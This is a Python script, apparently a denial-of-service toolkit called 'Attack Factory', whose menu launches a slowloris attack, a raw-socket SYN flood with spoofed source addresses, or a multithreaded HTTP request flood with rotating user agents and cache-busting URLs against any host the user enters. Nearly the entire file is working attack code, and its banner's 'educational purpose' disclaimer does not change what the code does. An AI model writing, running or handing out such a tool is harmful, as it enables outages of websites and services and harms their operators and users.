import time
import sys
import os
import sys
import time
import string
import math
from urllib.parse import urlparse
import  http.client
from random import *
from socket import *
from struct import *
from threading import *
from termcolor import colored,cprint

def fake_ip():
  skip = '127'
  rand = [0,0,0,0]
  for x in range(4):
    rand[x] = randint(1,224)
    if rand[x] == skip :
      fake_ip()
  fkip = '%d.%d.%d.%d' % (rand[0],rand[1],rand[2],rand[3])
  return fkip

def check_tgt(domain):
	tgt = domain
	try:
		ip = gethostbyname(tgt)
	except:
		sys.exit(cprint('[-] Can\'t resolve host:Unknow host!','red'))
	return ip

def add_useragent():
	uagents = []
	uagents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
	uagents.append('(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
	uagents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
	uagents.append('Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50')
	uagents.append('Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)')
	uagents.append('Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
	uagents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	uagents.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
	return uagents

def add_bots():
	bots=[]
	bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
	bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
	return bots
        

	
#synflood class starting from here
class Synflood(Thread):
	def __init__(self,tgt,ip,sock=None):
		Thread.__init__(self)
		self.tgt = tgt
		self.ip = ip
		self.psh = ''
		if sock is None:
			self.sock = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
			self.sock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
		else:
			self.sock=sock
		self.lock=Lock()
	def checksum(self):
		s = 0 
		msg = str(self.psh)
		for i in range(0,len(msg),2):
			if (i+1) < len(msg):
				w = (ord(msg[i]) << 8) + (ord(msg[i+1]))
				s = s+w
			else:
				s += ord(msg[i])
		s = (s>>16) + (s & 0xffff)
		s = ~s & 0xffff

		return s
	
	def Building_packet(self):
		ihl=5
		version=4
		tos=0
		tot=40
		id=54321
		frag_off=0
		ttl=64
		protocol=IPPROTO_TCP
		check=10
		s_addr = inet_aton(self.ip)
		d_addr=inet_aton(self.tgt)

		ihl_version = (version << 4) + ihl
		ip_header = pack('!BBHHHBBH4s4s',ihl_version,tos,tot,id,frag_off,ttl,protocol,check,s_addr,d_addr)

		source = 54321
		dest = 80
		seq = 0
		ack_seq = 0
		doff = 5
		fin = 0
		syn = 1
		rst = 0
		ack = 0
		psh = 0
		urg = 0
		window = htons(5840)
		check = 0
		urg_prt = 0

		offset_res = (doff << 4)
		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
		tcp_header=pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,check,urg_prt)
		src_addr = inet_aton(self.ip)
		dst_addr = inet_aton(self.tgt)
		place = 0
		protocol = IPPROTO_TCP
		tcp_length = len(tcp_header)

		self.psh = pack('!4s4sBBH',src_addr,dst_addr,place,protocol,tcp_length);
		self.psh = self.psh + tcp_header;

		tcp_checksum = self.checksum()

		tcp_header = pack('!HHLLBBHHH',source,dest,seq,ack_seq,offset_res,tcp_flags,window,tcp_checksum,urg_prt)
		packet = ip_header + tcp_header

		return packet
	def run(self):
		packet=self.Building_packet()
		try:
			self.lock.acquire()
			self.sock.sendto(packet,(self.tgt,0))
		except Exception as e:
			cprint(e,'red')
		finally:
			self.lock.release()


def synflood_start():
    try:
        uid = os.getuid()
        if uid == 0:
            print(colored("[+] You have enough permission to run SYNflood attack :)",'green'))
        else:
            print(colored("[!!] You don't have enough permissoin to run this script (Try with sudo)",'red'))
    except:
        print(colored("[!!] Windows user dont have permission to run synflood attack ",'red'))
        exit(0)
    tgt = input(colored("AttackFactory@Specify~Targethost/IP~#$ ",'yellow'))
    tgt = check_tgt(tgt)
    trd = input(colored("AttackFactory@Specify~NumberOfThreads( Default : 1000 )~#$ : ",'yellow'))
    if trd == "":
        trd = "1000"
    synsock=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)
    synsock.setsockopt(IPPROTO_IP,IP_HDRINCL,1)
    ts=[]
    threads=[]
    print (colored('[+] Started SYN Flood: ','blue')+colored(tgt,'red'))

    while True:
        for x in range(0,int(trd)):
            thread=Synflood(tgt,fake_ip(),sock=synsock)
            thread.setDaemon(True)
            thread.start()
            thread.join()
         
#Requester class starts from here
class Requester(Thread):
	def __init__(self,tgt):
		Thread.__init__(self)
		self.tgt = tgt
		self.port = None
		self.ssl = False
		self.req = []
		self.lock=Lock()
		url_type = urlparse(self.tgt)
		if url_type.scheme == 'https':
			self.ssl = True
			if self.ssl == True:
				self.port = 443
		else:
			self.port = 80

	def header(self):
		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
		acceptC = ['ISO-8859-1','utf-8','Windows-1251','ISO-8859-2','ISO-8859-15']
		bot = add_bots()
		c=choice(cachetype)
		a=choice(acceptEc)
		http_header = {
		    'User-Agent' : choice(add_useragent()),
		    'Cache-Control' : c,
		    'Accept-Encoding' : a,
		    'Keep-Alive' : '42',
		    'Host' : self.tgt,
		    'Referer' : choice(bot)
		}
		return http_header
	def rand_str(self):
		mystr=[]
		for x in range(3):
			chars = tuple(string.ascii_letters+string.digits)
			text = (choice(chars) for _ in range(randint(7,14)))
			text = ''.join(text)
			mystr.append(text)
		return '&'.join(mystr)
	def create_url(self):
		return self.tgt + '?' + self.rand_str()
	def data(self):
		url = self.create_url()
		http_header = self.header()
		return (url,http_header)

	def run(self):
		try:
			if self.ssl:
				conn = http.client.HTTPSConnection(self.tgt,self.port)
			else:
				conn = http.client.HTTPConnection(self.tgt,self.port)
				self.req.append(conn)
			for reqter in self.req:
				(url,http_header) = self.data()
				method = choice(['get','post'])
				reqter.request(method.upper(),url,None,http_header)
		except Exception as e:
			print (e)
		finally:
			self.closeConnections()
	def closeConnections(self):
		for conn in self.req:
			try:
				conn.close()
			except:
				pass
#slowloris defination
def slowloris_start():
    try:
        global allthesockets
        headers = [
            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Accept-language: en-US,en,q=0.5",
            "Connection: Keep-Alive"
        ]
        howmany_sockets = input(colored("AttackFactory@Specify~NumberOfThreads(Default : 200)~#$ : ",'yellow'))
        if howmany_sockets == "":
          howmany_sockets = 200
        ip = input(colored("AttackFactory@Specify~Targethost/ip~#$ ",'yellow'))
        ip = check_tgt(ip)
        port = input(colored("AttackFactory@Specify~Target~port(default : 80)~#$ ",'yellow'))
        if port == "":
          port = 80
        allthesockets = []
        print(colored("[+] Creating sockets...",'green'))
        for _ in range(howmany_sockets):
            try:
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((ip, port))
                allthesockets.append(s)
            except Exception as e:
                print(e)
        print(range(howmany_sockets)," sockets are ready.")
        num = 0
        for r in allthesockets:
            print("[",num,"]")
            num += 1 
            r.send("GET /?{} HTTP/1.1\r\n".format(randint(0, 2000)).encode("utf-8"))
            print(colored("Successfully sent [+] GET /? HTTP /1.1 ...",'green'))
            for header in headers:
                r.send(bytes("{}\r\n".format(header).encode("utf-8")))
            print(colored("Successfully sent [+] Headers ...",'green'))
 
        while True:
            for v in allthesockets:
                try:
                    v.send("X-a: {}\r\n".format(randint(1,5000)).encode("utf-8"))
                    print(colored("[-][-] Waiter sent.",'green'))
                except:
                    print(colored("[-] A socket failed, reattempting...",'red'))
                    allthesockets.remove(v)
                    try:
                        v.socket(AF_INET, SOCK_STREAM)
                        v.settimeout(4)
                        v.connect((ip,port))
                        #for each socket:
                        v.send("GET /?{} HTTP/1.1\r\n".format(randint(0,2000)).encode("utf-8"))
                        for header in headers:
                            v.send(bytes("{}\r\n".format(header).encode("utf-8")))
                    except:
                        pass
 
            print(colored("\n\n[+] Successfully sent [+] KEEP-ALIVE headers...\n",'green'))
            print(colored("Sleeping off ...",'red'))
            time.sleep(1)
    except ConnectionRefusedError:
        print(colored("[-] Connection refused, retrying...",'red'))
        slowloris_start()

def request_start():
    tgt = input(colored("AttackFactory@Specify~Targethost/IP~#$ ",'yellow'))
    tgt = check_tgt(tgt)
    trd = input(colored("AttackFactory@Specify~NumberOfThreads( Default : 1000)~#$",'yellow'))
    if trd == "":
        trd = 1000
    threads = [];
    print (colored('[+] Started sending request to: ','blue')+colored(tgt,'red'));
    while True :
        for x in range(int(trd)):
            t=Requester(tgt)
            t.setDaemon(True)
            t.start()
            t.join()
        

def get_attack_table():
    attacks = ["slowloris DosScript","SYNflood DDosScript","Requests DosScript"]
    print(colored("\n Index       AttackType \n",'blue'))
    for attack in attacks:
        print( colored(" [  "+ str(attacks.index(attack)+1)+"  ]"+ "     "+ attack,'blue'))
    print(colored("\n [  0  ]       Exit\n",'red')) 
    iattack = input(colored('AttackFactory@Choose~Attack~#$ ','green'))
    if iattack == "0":
        print(colored("[-] Exiting ... ",'red'))
        exit(0)
    elif iattack == "1":
        slowloris_start()
    elif iattack == "2":
        synflood_start()
    elif iattack == "3":
        request_start()
    else:
        print(colored("[!] Choose Correct AttackType",'red'))
        get_attack_table()

def main():
    banner = '''
		 ·▄▄▄▄        .▄▄ ·    ▄▄▄▄  ·▄▄▄▄        .▄▄ · 
		██▪ ██ ▪     ▐█ ▀.     ██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
		▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄    █· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄	
		██. ██ ▐█▌.▐▌▐█▄▪▐█    ██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
		▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀     ▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 

			
		
	 	Attack Factory | Script used for testing ddos | Ddos attack  

	[!] Daniel Of Service Attack of 3 types
	[!] STRICKLY WARNING : Use it for only Educational purpose 
	Either it can lead you to [x] jail [x]

    '''
    add_bots();add_useragent()
    print(colored(banner,'red'))
    get_attack_table()  